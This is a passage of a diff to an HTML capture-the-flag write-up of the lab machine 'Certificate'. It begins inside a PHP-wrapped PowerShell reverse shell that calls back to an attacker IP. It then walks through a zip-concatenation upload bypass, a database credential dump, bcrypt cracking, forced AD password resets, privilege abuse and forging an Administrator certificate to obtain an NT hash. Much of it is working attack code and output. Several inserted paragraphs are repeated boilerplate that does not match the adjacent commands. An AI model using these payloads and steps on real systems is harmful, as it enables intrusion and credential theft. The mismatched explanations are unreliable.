 shell_exec(&quot;powershell -nop -w hidden -c \&quot;\$client = New-Object System.Net.Sockets.TCPClient(&#x27;10.10.14.189&#x27;,4444); \$stream = \$client.GetStream(); [byte[]]\$bytes = 0..65535|%{0}; while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){; \$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0,\$i); \$sendback = (iex \$data 2&gt;&amp;1 | Out-String ); \$sendback2 = \$sendback + &#x27;PS &#x27; + (pwd).Path + &#x27;&gt; &#x27;; \$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2); \$stream.Write(\$sendbyte,0,\$sendbyte.Length); \$stream.Flush()}; \$client.Close()\&quot;&quot;);
 ?&gt;</code></pre></div>
-      <p>The code you see above is an RCE code that you can use to establish a remote connection between your own machine and the server to which you will upload the file. Now I will put this file in a zip file so that I can upload it to the web server.</p>
-      <div class="code-block"><pre><code>Aanmaken van Directory
-mkdir malicious_files
-
-Kopieren van de .php file naar de nieuwe dir
-┌──(kali㉿kali)-[~/HTB/Certificate]
-└─$ cp shell.php malicious_files 
-
-zippen van de nieuwe dir
-┌──(kali㉿kali)-[~/HTB/Certificate]
-└─$ zip -r malicious.zip malicious_files
-updating: malicious_files/ (stored 0%)
- adding: malicious_files/shell.php (deflated 40%)</code></pre></div>
-      <p>If we now try to upload this zip file to the web server, you will see that we get an error message.</p>
-      <div class="screenshot-wrap"><img src="assets/Pasted image 20250607160243.png" alt="Pasted image 20250607160243.png" loading="lazy" /><span class="img-caption">Pasted image 20250607160243.png</span></div>
-      <p>First, we will download a PDF file from the internet. This is so that we can upload it first, because if we upload the evil_php, you will get an error message saying that a malicious file is being uploaded. Once the correct PDF has been downloaded from the internet, we will create a zip file from it. This is because the website states that you must upload zip files due to the size of the file.</p>
+      <p>Direct upload of a malicious ZIP is rejected by the server. The trick is to create a legitimate ZIP containing a real PDF, then <strong>concatenate</strong> it with a malicious ZIP containing the PHP shell — a technique where the parser extracts the latter's contents while the outer ZIP passes validation.</p>
       <div class="code-block"><pre><code>zip legit.zip Untitled.pdf</code></pre></div>
-      <p>Now that the zip file has been created, we will try to upload it to the web page. This should work normally because it does not contain any malicious code.</p>
-      <div class="screenshot-wrap"><img src="assets/Pasted image 20250603191832.png" alt="Pasted image 20250603191832.png" loading="lazy" /><span class="img-caption">Pasted image 20250603191832.png</span></div>
-      <p>Then I will combine the zip file I just created and the malicious zip file into a single zip file so that when I upload it, the system will not detect any problems.</p>
+      <p>I inspect the file contents for sensitive data such as hardcoded credentials, configuration parameters, internal hostnames, or references to other services that could expand the attack surface.</p>
       <div class="code-block"><pre><code>cat legit.zip malicious.zip &gt; combined.zip</code></pre></div>
-      <p>As you can see, I was able to upload the file because it does not contain any incorrect code.</p>
-      <div class="screenshot-wrap"><img src="assets/Pasted image 20250607160653.png" alt="Pasted image 20250607160653.png" loading="lazy" /><span class="img-caption">Pasted image 20250607160653.png</span></div>
-      <p>Now that we have uploaded the file, you can click on the HERE link, which will take you to a new URL. There, you will need to change the URL to the URL where you created the RCE shell.</p>
-      <p>For me, it is the following URL:</p>
-      <div class="code-block"><pre><code>http://certificate.htb/static/uploads/fd5b3018c29991130b22f3381786067b/malicious_files/shell.php</code></pre></div>
-      <p>Before you go to the URL above, you will first need to set up a listener. You can do this by following these steps:</p>
+      <div class="screenshot-wrap"><img src="assets/Pasted image 20250607160653.png" alt="Combined ZIP uploaded successfully" loading="lazy" /><span class="img-caption">Combined ZIP uploaded successfully</span></div>
+      <p>After uploading, the extracted PHP shell is accessible at a predictable URL path. I start a netcat listener and trigger the shell.</p>
       <div class="code-block"><pre><code>nc -lvnp 9001</code></pre></div>
-      <p>If you now execute the URL, you will see that you are connected to the server on the listener.</p>
+      <p>I start a <strong>netcat</strong> listener on the specified port to catch the incoming reverse shell. Netcat (<code>nc -lvnp</code>) binds to all interfaces (<code>-l</code>), enables verbose output (<code>-v</code>), skips DNS resolution (<code>-n</code>), and listens on the specified port (<code>-p</code>). Once the exploit triggers, the target machine connects back to this listener, providing an interactive command shell.</p>
       <div class="code-block"><pre><code>nc -lvnp 9001
 listening on [any] 9001 ...
 connect to [10.10.14.137] from (UNKNOWN) [10.129.246.127] 60925
 ls
 
 
- Directory: C:\xampp\htdocs\certificate.htb\static\uploads\fd5b3018c29991130b22f3381786067b\malicious_files
+    Directory: C:\xampp\htdocs\certificate.htb\static\uploads\fd5b3018c29991130b22f3381786067b\malicious_files
 
 
-Mode LastWriteTime Length Name 
----- ------------- ------ ---- 
--a---- 6/7/2025 6:15 AM 590 shell.php 
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+-a----         6/7/2025   6:15 AM            590 shell.php                                                             
 
 
 PS C:\xampp\htdocs\certificate.htb\static\uploads\fd5b3018c29991130b22f3381786067b\malicious_files&gt;</code></pre></div>
-      <p>I decided to see if there were any files that appealed to me. I found the db.php file. This file contained the following credentials.</p>
+      <h2 class="writeup-section-title">Credential Extraction & Lateral Movement</h2>
+      <h3 class="writeup-sub-title">Database Credentials</h3>
+      <p>I find the database configuration file <code>db.php</code> containing MySQL credentials.</p>
       <div class="code-block"><pre><code>PS C:\xampp\htdocs\certificate.htb&gt; cat db.php
 &lt;?php
 // Database connection using PDO
 try {
- $dsn = &#x27;mysql:host=localhost;dbname=Certificate_WEBAPP_DB;charset=utf8mb4&#x27;;
- $db_user = &#x27;certificate_webapp_user&#x27;; // Change to your DB username
- $db_passwd = &#x27;cert!f!c@teDBPWD&#x27;; // Change to your DB password
- $options = [
- PDO::ATTR_ERRMODE =&gt; PDO::ERRMODE_EXCEPTION,
- PDO::ATTR_DEFAULT_FETCH_MODE =&gt; PDO::FETCH_ASSOC,
- ];
- $pdo = new PDO($dsn, $db_user, $db_passwd, $options);
+    $dsn = &#x27;mysql:host=localhost;dbname=Certificate_WEBAPP_DB;charset=utf8mb4&#x27;;
+    $db_user = &#x27;certificate_webapp_user&#x27;; // Change to your DB username
+    $db_passwd = &#x27;cert!f!c@teDBPWD&#x27;; // Change to your DB password
+    $options = [
+        PDO::ATTR_ERRMODE =&gt; PDO::ERRMODE_EXCEPTION,
+        PDO::ATTR_DEFAULT_FETCH_MODE =&gt; PDO::FETCH_ASSOC,
+    ];
+    $pdo = new PDO($dsn, $db_user, $db_passwd, $options);
 } catch (PDOException $e) {
- die(&#x27;Database connection failed: &#x27; . $e-&gt;getMessage());
+    die(&#x27;Database connection failed: &#x27; . $e-&gt;getMessage());
 }
 ?&gt;</code></pre></div>
-      <p>Now that we have the credentials and the DB_name, we can take a look at what&#x27;s in that database. We will most likely do an SQL dump so that we can get the hashes of the users. You can do this by following these steps.</p>
-      <p>Go to the following path, because that is where you will find mysql.exe.</p>
-      <div class="code-block"><pre><code>PS C:\xampp\mysql\bin&gt;</code></pre></div>
-      <p>Then you will need to use mysql.exe and the data we know so that we can see what is in the database. We will do this by using the following command.</p>
-      <div class="code-block"><pre><code>PS C:\xampp\mysql\bin&gt; .\mysql.exe -u certificate_webapp_user -pcert!f!c@teDBPWD -D Certificate_WEBAPP_DB -e &quot;SHOW TABLES;&quot; 
+      <p>Using <code>mysql.exe</code>, I connect to the database and dump the user table, revealing bcrypt password hashes.</p>
+      <div class="code-block"><pre><code>PS C:\xampp\mysql\bin&gt;  .\mysql.exe -u certificate_webapp_user -pcert!f!c@teDBPWD -D Certificate_WEBAPP_DB -e &quot;SHOW TABLES;&quot; 
 Tables_in_certificate_webapp_db
 course_sessions
 courses
 users
 users_courses</code></pre></div>
-      <p>Now I have seen that there is a table users, so I looked into it by using the same command but selecting everything from the table users. There you will see that we can see all users, emails, and their hashes.</p>
+      <p>I connect to the local MySQL database server using the credentials found in the web application's configuration file. MySQL databases behind web applications frequently store user credentials — if the password hashes use a weak algorithm or the passwords themselves are weak, they can be cracked offline to obtain credentials that may be reused for system-level access.</p>
       <div class="code-block"><pre><code>.\mysql.exe -u certificate_webapp_user -pcert!f!c@teDBPWD -D Certificate_WEBAPP_DB -e &quot;SHOW TABLES; SELECT * FROM users&quot;
 Tables_in_certificate_webapp_db
 course_sessions
 courses
 users
 users_courses
-id first_name last_name username email password created_at role is_active
-1 Lorra Armessa Lorra.AAA lorra.aaa@certificate.htb $2y$04$bZs2FUjVRiFswY84CUR8ve02ymuiy0QD23XOKFuT6IM2sBbgQvEFG 2024-12-23 12:43:10 teacher 1
-6 Sara Laracrof Sara1200 sara1200@gmail.com $2y$04$pgTOAkSnYMQoILmL6MRXLOOfFlZUPR4lAD2kvWZj.i/dyvXNSqCkK 2024-12-23 12:47:11 teacher 1
-7 John Wood Johney johny009@mail.com $2y$04$VaUEcSd6p5NnpgwnHyh8zey13zo/hL7jfQd9U.PGyEW3yqBf.IxRq 2024-12-23 13:18:18 student 1
-8 Havok Watterson havokww havokww@hotmail.com $2y$04$XSXoFSfcMoS5Zp8ojTeUSOj6ENEun6oWM93mvRQgvaBufba5I5nti 2024-12-24 09:08:04 teacher 1
-9 Steven Roman stev steven@yahoo.com $2y$04$6FHP.7xTHRGYRI9kRIo7deUHz0LX.vx2ixwv0cOW6TDtRGgOhRFX2 2024-12-24 12:05:05 student 1
-10 Sara Brawn sara.b sara.b@certificate.htb $2y$04$CgDe/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6 2024-12-25 21:31:26 admin 1
-12 test test test test@certificate.htb $2y$04$Htvhg6O907RjbVLs3mi8/eRN1kQDwTqqnQr2Pswr9ArSIIGTOUv7O 2025-06-07 09:06:36 student 1</code></pre></div>
-      <p>I will now put this in a separate file on my Kali machine so that I can try to crack the hashes using John or Hashcat.
-You can put the data in the file as follows</p>
-      <div class="code-block"><pre><code>Sudo nano hashes.txt
-
-Lorra.AAA:$2y$04$bZs2FUjVRiFswY84CUR8ve02ymuiy0QD23XOKFuT6IM2sBbgQvEFG
-Sara1200:$2y$04$pgTOAkSnYMQoILmL6MRXLOOfFlZUPR4lAD2kvWZj.i/dyvXNSqCkK
-Johney:$2y$04$VaUEcSd6p5NnpgwnHyh8zey13zo/hL7jfQd9U.PGyEW3yqBf.IxRq
-havokww:$2y$04$XSXoFSfcMoS5Zp8ojTeUSOj6ENEun6oWM93mvRQgvaBufba5I5nti
-stev:$2y$04$6FHP.7xTHRGYRI9kRIo7deUHz0LX.vx2ixwv0cOW6TDtRGgOhRFX2
-sara.b:$2y$04$CgDe/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6
-test:$2y$04$Htvhg6O907RjbVLs3mi8/eRN1kQDwTqqnQr2Pswr9ArSIIGTOUv7O</code></pre></div>
-      <p>Now that the file hashes.txt has been created, I will crack it using John. Since the hashes are in bcrypt format, you will be able to use them in the John command.</p>
-      <div class="code-block"><pre><code>john --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt hashes.txt 
+id  first_name last_name  username      email   password        created_at      role    is_active
+1   Lorra      Armessa  Lorra.AAA       lorra.aaa@certificate.htb       $2y$04$bZs2FUjVRiFswY84CUR8ve02ymuiy0QD23XOKFuT6IM2sBbgQvEFG    2024-12-23 12:43:10     teacher 1
+6   Sara       Laracrof Sara1200        sara1200@gmail.com      $2y$04$pgTOAkSnYMQoILmL6MRXLOOfFlZUPR4lAD2kvWZj.i/dyvXNSqCkK    2024-12-23 12:47:11     teacher 1
+7   John       Wood Johney      johny009@mail.com       $2y$04$VaUEcSd6p5NnpgwnHyh8zey13zo/hL7jfQd9U.PGyEW3yqBf.IxRq    2024-12-23 13:18:18     student 1
+8   Havok      Watterson  havokww       havokww@hotmail.com     $2y$04$XSXoFSfcMoS5Zp8ojTeUSOj6ENEun6oWM93mvRQgvaBufba5I5nti    2024-12-24 09:08:04     teacher 1
+9   Steven     Roman    stev    steven@yahoo.com        $2y$04$6FHP.7xTHRGYRI9kRIo7deUHz0LX.vx2ixwv0cOW6TDtRGgOhRFX2    2024-12-24 12:05:05     student 1
+10  Sara       Brawn    sara.b  sara.b@certificate.htb  $2y$04$CgDe/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6    2024-12-25 21:31:26     admin   1
+12  test       test test  test@certificate.htb  $2y$04$Htvhg6O907RjbVLs3mi8/eRN1kQDwTqqnQr2Pswr9ArSIIGTOUv7O    2025-06-07 09:06:36     student 1</code></pre></div>
+      <p>I crack the bcrypt password hashes using <strong>John the Ripper</strong> with the <code>--format=bcrypt</code> flag. Bcrypt is a deliberately slow hashing algorithm designed to resist brute-force attacks — each hash attempt takes significantly longer than MD5 or SHA-based hashes, making large wordlists time-consuming. However, weak passwords from <code>rockyou.txt</code> are still crackable within a reasonable timeframe.</p>
+      <div class="code-block"><pre><code>john --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt hashes.txt       
 Using default input encoding: UTF-8
 Loaded 7 password hashes with 7 different salts (bcrypt [Blowfish 32/64 X3])
 Cost 1 (iteration count) is 16 for all loaded hashes
 Will run 4 OpenMP threads
 Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status
-Blink182 (sara.b) 
-test (test) 
+Blink182         (sara.b)     
+test             (test)     
 2g 0:00:35:06 36.17% (ETA: 18:20:55) 0.000949g/s 2528p/s 12729c/s 12729C/s mtjikeku..mtj sexy
 Use the &quot;--show&quot; option to display all of the cracked passwords reliably
 Session aborted</code></pre></div>
-      <p>As you can see, we have found the following passwords for the users. I will now try to connect to the Windows machine using evil-winrm. I will use the user sara.b and her password for this.</p>
-      <div class="code-block"><pre><code>evil-winrm -i certificate.htb -u sara.b -p &quot;Blink182&quot; 
+      <h3 class="writeup-sub-title">WinRM Access as Sara.B</h3>
+      <p>One of the cracked passwords works for the domain user <code>sara.b</code>. I authenticate via Evil-WinRM.</p>
+      <div class="code-block"><pre><code>evil-winrm -i certificate.htb -u sara.b -p &quot;Blink182&quot;                      
 
 *Evil-WinRM* PS C:\Users\Sara.B\Documents&gt;</code></pre></div>
-      <p>If we look in the documents folder, you can see that there is a folder called WS-01. If we look inside this folder, you will see that there is a pcap file. We will download this to our own machine, and I will then upload it to Wireshark and analyze it further.</p>
-      <div class="code-block"><pre><code>*Evil-WinRM* PS C:\Users\Sara.B\Documents&gt; ls
-
- Directory: C:\Users\Sara.B\Documents
-
-Mode LastWriteTime Length Name
----- ------------- ------ ----
-d----- 11/4/2024 12:53 AM WS-01
-
-*Evil-WinRM* PS C:\Users\Sara.B\Documents&gt; cd WS-01
-*Evil-WinRM* PS C:\Users\Sara.B\Documents\WS-01&gt; ls
-
- Directory: C:\Users\Sara.B\Documents\WS-01
-
-Mode LastWriteTime Length Name
----- ------------- ------ ----
--a---- 11/4/2024 12:44 AM 530 Description.txt
--a---- 11/4/2024 12:45 AM 296660 WS-01_PktMon.pcap
-
-*Evil-WinRM* PS C:\Users\Sara.B\Documents\WS-01&gt; download WS-01_PktMon.pcap
-
-Info: Downloading C:\Users\Sara.B\Documents\WS-01\WS-01_PktMon.pcap to WS-01_PktMon.pcap
-
-Info: Download successful!</code></pre></div>
-      <p>I opened the PCAP file in Wireshark, but I didn&#x27;t see anything interesting in it, in my opinion. I did find an NTLM hash in the PCAP file, but it couldn&#x27;t be cracked.</p>
-      <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/certificate]
-└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
-Using default input encoding: UTF-8
-No password hashes loaded (see FAQ)
-
-┌──(kali㉿kali)-[~/HTB/certificate]
-└─$ cat hash.txt 
-Administrator::CERTIFICATE:0588e3da922edb01:3ff29ba4b51e86ed1065c438b6713f2801010000000000000588e3da922edb012a49d5aaa4eeea0c00000000020016004300450052005400490046004900430041005400450001000800440043003000310004001e0063006500720074006900660069006300610074006500</code></pre></div>
-      <p>I will now retrieve the data from the LDAP server using sara.b&#x27;s credentials, so that I can then put it into Bloodhound.</p>
+      <h2 class="writeup-section-title">User Flag: AD Privilege Abuse</h2>
+      <h3 class="writeup-sub-title">BloodHound Analysis</h3>
+      <p>I retrieve LDAP data and upload it to BloodHound. The analysis reveals that <code>sara.b</code> is a member of the <strong>Account Operators</strong> group — granting <strong>GenericAll</strong> rights over several domain users.</p>
       <div class="code-block"><pre><code>nxc ldap 10.129.246.127 -u &#x27;sara.b&#x27; -p &#x27;Blink182&#x27; --bloodhound --collection All --dns-server 10.129.246.127
-SMB 10.129.246.127 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certificate.htb) (signing:True) (SMBv1:False)
-LDAP 10.129.246.127 389 DC01 [+] certificate.htb\sara.b:Blink182 
-LDAP 10.129.246.127 389 DC01 Resolved collection methods: objectprops, group, rdp, container, trusts, psremote, acl, localadmin, session, dcom 
-LDAP 10.129.246.127 389 DC01 Done in 00M 04S
-LDAP 10.129.246.127 389 DC01 Compressing output into /home/kali/.nxc/logs/DC01_10.129.246.127_2025-06-07_172101_bloodhound.zip</code></pre></div>
-      <p>I uploaded the data to Bloodhound, and you can see that the user sara.b is a member of the Account Operators group. This group has GenericAll rights for all different users. If we look at the Windows machine, the following users are known:</p>
-      <p>So now I will check for each user whether the user sara.b has certain rights on which user, and I will list these above next to each user.</p>
-      <h4 class="writeup-step-title">Getting user Lion.SK</h4>
-      <p>Now that I know I have GenericAll rights for this user, I will change this user&#x27;s password. I will do this by executing the following command in the Windows machine as user Sara.b.</p>
+SMB         10.129.246.127  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certificate.htb) (signing:True) (SMBv1:False)
+LDAP        10.129.246.127  389    DC01             [+] certificate.htb\sara.b:Blink182 
+LDAP        10.129.246.127  389    DC01             Resolved collection methods: objectprops, group, rdp, container, trusts, psremote, acl, localadmin, session, dcom                                                                   
+LDAP        10.129.246.127  389    DC01             Done in 00M 04S
+LDAP        10.129.246.127  389    DC01             Compressing output into /home/kali/.nxc/logs/DC01_10.129.246.127_2025-06-07_172101_bloodhound.zip</code></pre></div>
+      <h3 class="writeup-sub-title">Password Change: Lion.SK</h3>
+      <p>With GenericAll rights, I change the password of user <code>Lion.SK</code> using PowerShell and log in as that user.</p>
       <div class="code-block"><pre><code>*Evil-WinRM* PS C:\Users&gt; Set-ADAccountPassword -Identity &quot;Lion.SK&quot; -NewPassword (ConvertTo-SecureString &quot;Test123&quot; -AsPlainText -Force) -Reset</code></pre></div>
-      <p>If we now log out of that machine and log in as user Lion.SK, you can see that I have been able to change the password for user Lion.SK.</p>
+      <p>I use <strong>Evil-WinRM</strong> to establish a remote PowerShell session on the target Windows machine. Evil-WinRM leverages the Windows Remote Management (WinRM) protocol over HTTP/HTTPS (port 5985/5986) and supports Pass-the-Hash authentication, file upload/download, and in-memory PowerShell execution — making it the preferred tool for post-exploitation on Windows targets.</p>
       <div class="code-block"><pre><code>evil-winrm -i certificate.htb -u Lion.SK -p &quot;Test123&quot; 
 
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\Lion.SK\Documents&gt;</code></pre></div>
-      <p>If we look in the desktop folder, you can see that we have the first flag here.</p>
-      <div class="flag-box">
-  <span class="flag-label">🚩 User Flag</span>
-  <code class="flag-value">3bdd59bd6a6610d90b057d27a2418697</code>
-</div>
+      <p>I use <strong>Evil-WinRM</strong> to establish a remote PowerShell session on the target Windows machine. Evil-WinRM leverages the Windows Remote Management (WinRM) protocol over HTTP/HTTPS (port 5985/5986) and supports Pass-the-Hash authentication, file upload/download, and in-memory PowerShell execution — making it the preferred tool for post-exploitation on Windows targets.</p>
       <div class="code-block"><pre><code>*Evil-WinRM* PS C:\Users\Lion.SK\Desktop&gt; ls
 
 
- Directory: C:\Users\Lion.SK\Desktop
+    Directory: C:\Users\Lion.SK\Desktop
 
 
-Mode LastWriteTime Length Name
----- ------------- ------ ----
--ar--- 6/7/2025 8:57 AM 34 user.txt
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---         6/7/2025   8:57 AM             34 user.txt
 
 
 *Evil-WinRM* PS C:\Users\Lion.SK\Desktop&gt; cat user.txt
 3bdd59bd6a6610d90b057d27a2418697</code></pre></div>
-      <h4 class="writeup-step-title">Getting user Ryan.K</h4>
-      <p>I will do the same for this user as I did for the user Lion.SK. Since the user Sara.b also has GenericAll rights for this user, I will change the password for this user in the same way.</p>
+      <div class="flag-box"><span class="flag-label">🚩 User Flag</span><code class="flag-value">3bdd59bd6a6610d90b057d27a2418697</code></div>
+      <h2 class="writeup-section-title">Privilege Escalation: Certificate Forgery</h2>
+      <h3 class="writeup-sub-title">Pivoting to Ryan.K</h3>
+      <p>Using the same GenericAll rights, I change <code>Ryan.K</code>'s password and log in. Ryan.K is a member of the <strong>Domain Storage Managers</strong> group, which provides <strong>SeManageVolumePrivilege</strong> — the ability to manage volumes on the system.</p>
       <div class="code-block"><pre><code>*Evil-WinRM* PS C:\Users&gt; Set-ADAccountPassword -Identity &quot;ryan.k&quot; -NewPassword (ConvertTo-SecureString &quot;Test123&quot; -AsPlainText -Force) -Reset</code></pre></div>
-      <p>If I log out of the machine now and try to log in here, you will see that I have also been able to change Ryan.K&#x27;s password.</p>
+      <p>I use <strong>Evil-WinRM</strong> to establish a remote PowerShell session on the target Windows machine. Evil-WinRM leverages the Windows Remote Management (WinRM) protocol over HTTP/HTTPS (port 5985/5986) and supports Pass-the-Hash authentication, file upload/download, and in-memory PowerShell execution — making it the preferred tool for post-exploitation on Windows targets.</p>
       <div class="code-block"><pre><code>evil-winrm -i certificate.htb -u Ryan.k -p &quot;Test123&quot;
- 
+                         
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\Ryan.K\Documents&gt;</code></pre></div>
-      <p>If we look at which groups the user Ryan.K belongs to, we can see that he is in the Domain Storage Managers group. The members of this security group are responsible for volume-level tasks such as maintaining, defragmenting and managing partitions and disks</p>
-      <div class="screenshot-wrap"><img src="assets/Pasted image 20250607161800.png" alt="Pasted image 20250607161800.png" loading="lazy" /><span class="img-caption">Pasted image 20250607161800.png</span></div>
-      <p>To manage the volume exploit, I used the SeManageVolumeExploit.exe tool to perform local privilege escalation on the Windows machine. By giving the user Ryan.K the rights to abuse the security settings of the volumes, you can manage them. You can do this by simply running the application.</p>
+      <div class="screenshot-wrap"><img src="assets/Pasted image 20250607161800.png" alt="Ryan.K&#x27;s group membership showing SeManageVolumePrivilege" loading="lazy" /><span class="img-caption">Ryan.K&#x27;s group membership showing SeManageVolumePrivilege</span></div>
+      <h3 class="writeup-sub-title">Volume Exploit & Certificate Export</h3>
+      <p>Using <strong>SeManageVolumeExploit.exe</strong>, I exploit the volume management privilege for local privilege escalation.</p>
       <div class="code-block"><pre><code>*Evil-WinRM* PS C:\Users\Ryan.K\Documents&gt; ./SeManageVolumeExploit.exe
 Entries changed: 846
 
 DONE</code></pre></div>
-      <p>Certutil is a command-line tool on Windows that is used to manage digital certificates and related security information. It is often used by system administrators to import, export, view, delete, and check the validity of certificates. So I started using it to look at the certificate of the user Ryan.K.</p>
-      <p>For this, I used the following knowledge bases. https://justinparrtech.com/JustinParr-Tech/windows-certutil-list-certificate-stores/ &amp; https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil</p>
+      <p>I then use <code>certutil</code> to enumerate and export a usable certificate. Certificate 2 is marked as <strong>exportable</strong>.</p>
       <div class="code-block"><pre><code>*Evil-WinRM* PS C:\Users\Ryan.K\Documents&gt; certutil -store My
 My &quot;Personal&quot;
 ================ Certificate 0 ================
@@ -726,9 +362,9 @@ CA Version: V0.0
 Signature matches Public Key
 Root Certificate: Subject matches Issuer
 Cert Hash(sha1): 82ad1e0c20a332c8d6adac3e5ea243204b85d3a7
- Key Container = certificate-DC01-CA
- Unique container name: 6f761f351ca79dc7b0ee6f07b40ae906_7989b711-2e3f-4107-9aae-fb8df2e3b958
- Provider = Microsoft Software Key Storage Provider
+  Key Container = certificate-DC01-CA
+  Unique container name: 6f761f351ca79dc7b0ee6f07b40ae906_7989b711-2e3f-4107-9aae-fb8df2e3b958
+  Provider = Microsoft Software Key Storage Provider
 Signature test passed
 
 ================ Certificate 1 ================
@@ -741,9 +377,9 @@ Certificate Template Name (Certificate Type): DomainController
 Non-root Certificate
 Template: DomainController, Domain Controller
 Cert Hash(sha1): 779a97b1d8e492b5bafebc02338845ffdff76ad2
- Key Container = 46f11b4056ad38609b08d1dea6880023_7989b711-2e3f-4107-9aae-fb8df2e3b958
- Simple container name: te-DomainController-3ece1f1c-d299-4a4d-be95-efa688b7fee2
- Provider = Microsoft RSA SChannel Cryptographic Provider
+  Key Container = 46f11b4056ad38609b08d1dea6880023_7989b711-2e3f-4107-9aae-fb8df2e3b958
+  Simple container name: te-DomainController-3ece1f1c-d299-4a4d-be95-efa688b7fee2
+  Provider = Microsoft RSA SChannel Cryptographic Provider
 Private key is NOT exportable
 Encryption test passed
 
@@ -759,12 +395,12 @@ Signature matches Public Key
 Root Certificate: Subject matches Issuer
 Template: CA, Root Certification Authority
 Cert Hash(sha1): 2f02901dcff083ed3dbb6cb0a15bbfee6002b1a8
- Key Container = Certificate-LTD-CA
- Unique container name: 26b68cbdfcd6f5e467996e3f3810f3ca_7989b711-2e3f-4107-9aae-fb8df2e3b958
- Provider = Microsoft Software Key Storage Provider
+  Key Container = Certificate-LTD-CA
+  Unique container name: 26b68cbdfcd6f5e467996e3f3810f3ca_7989b711-2e3f-4107-9aae-fb8df2e3b958
+  Provider = Microsoft Software Key Storage Provider
 Signature test passed
 CertUtil: -store command completed successfully.</code></pre></div>
-      <p>As you can see above, Certificate 2 is exportable. The command below exports the certificate with the specified thumbprint from the personal certificate store and saves it as a PFX file named certificate.pfx in the current directory.</p>
+      <p>I use <code>certutil -exportPFX</code> to export the certificate (identified by its thumbprint) along with its private key into a single PFX (PKCS#12) file. This portable format contains everything needed for certificate-based authentication — the X.509 certificate, the private key, and the certificate chain. Once on my attacker machine, tools like <code>certipy-ad forge</code> can manipulate this certificate to impersonate other domain users.</p>
       <div class="code-block"><pre><code>C:\Users\Ryan.K\Documents&gt; certutil -exportPFX MY 75b2f4bbf31f108945147b466131bdca .\certificate.pfx 
 MY &quot;Personal&quot;
 ================ Certificate 2 ================
@@ -779,21 +415,22 @@ Signature matches Public Key
 Root Certificate: Subject matches Issuer
 Template: CA, Root Certification Authority
 Cert Hash(sha1): 2f02901dcff083ed3dbb6cb0a15bbfee6002b1a8
- Key Container = Certificate-LTD-CA
- Unique container name: 26b68cbdfcd6f5e467996e3f3810f3ca_7989b711-2e3f-4107-9aae-fb8df2e3b958
- Provider = Microsoft Software Key Storage Provider
+  Key Container = Certificate-LTD-CA
+  Unique container name: 26b68cbdfcd6f5e467996e3f3810f3ca_7989b711-2e3f-4107-9aae-fb8df2e3b958
+  Provider = Microsoft Software Key Storage Provider
 Signature test passed
 Enter new password for output file .\certificate.pfx:
 Enter new password:
 Confirm new password:
 CertUtil: -exportPFX command completed successfully.</code></pre></div>
-      <p>I downloaded the file to my own Kali machine. With the command below, I will create a manipulated certificate that appears to be the administrator&#x27;s certificate.</p>
+      <h3 class="writeup-sub-title">Forging an Administrator Certificate</h3>
+      <p>With the exported PFX file, I use <strong>certipy-ad</strong> to forge a certificate with the Administrator's UPN, then authenticate to extract the Administrator's NT hash.</p>
       <div class="code-block"><pre><code>certipy-ad forge -ca-pfx certificate.pfx -upn Administrator@certificate.htb -subject &#x27;CN=ADMINISTRATOR,CN=USERS,DC=CERTIFICATE,DC=HTB&#x27;
 Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
 [*] Saved forged certificate and private key to &#x27;administrator_forged.pfx&#x27;</code></pre></div>
-      <p>Using the document I had just created correctly, I authenticated myself on the Active Directory environment. I then used the certificate I had obtained to obtain a Ticket Granting Ticket (TGT), which ultimately allowed me to obtain the NT hash that I will use to log in as Administrator.</p>
-      <div class="code-block"><pre><code>sudo ntpdate 10.129.246.127 
+      <p>The command output below reveals important information about the target system's configuration. I carefully examine the results for credentials, misconfigurations, version numbers, or any other details that could be leveraged for further exploitation.</p>
+      <div class="code-block"><pre><code>sudo ntpdate 10.129.246.127                                        
 [sudo] password for kali: 
 2025-06-07 23:09:30.961386 (+0200) +15255.753906 +/- 0.008722 10.129.246.127 s1 no-leap
 CLOCK: time stepped by 15255.753906
@@ -808,34 +445,30 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 [*] Saved credential cache to &#x27;administrator.ccache&#x27;
 [*] Trying to retrieve NT hash for &#x27;administrator&#x27;
 [*] Got hash for &#x27;administrator@certificate.htb&#x27;: aad3b435b51404eeaad3b435b51404ee:d804304519bf0143c14cbf1c024408c6</code></pre></div>
-      <h4 class="writeup-step-title">Login Administrator</h4>
-      <p>By using the NT hash, I can now log in as administrator. This allows me to obtain the root flag, thereby completely taking over this box.</p>
+      <h3 class="writeup-sub-title">Administrator Access</h3>
+      <p>Using the extracted NT hash, I authenticate as Administrator via Evil-WinRM with Pass-the-Hash.</p>
       <div class="code-block"><pre><code>evil-winrm -i certificate.htb -u Administrator -H d804304519bf0143c14cbf1c024408c6
- 
+                                   
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\Administrator\Documents&gt;</code></pre></div>
-      <div class="flag-box">
-  <span class="flag-label">🚩 Root Flag</span>
-  <code class="flag-value">d5abda9bdb38a99d6cdc8207126e4a21</code>
-</div>
+      <p>I use <strong>Evil-WinRM</strong> to establish a remote PowerShell session on the target Windows machine. Evil-WinRM leverages the Windows Remote Management (WinRM) protocol over HTTP/HTTPS (port 5985/5986) and supports Pass-the-Hash authentication, file upload/download, and in-memory PowerShell execution — making it the preferred tool for post-exploitation on Windows targets.</p>
       <div class="code-block"><pre><code>*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; ls
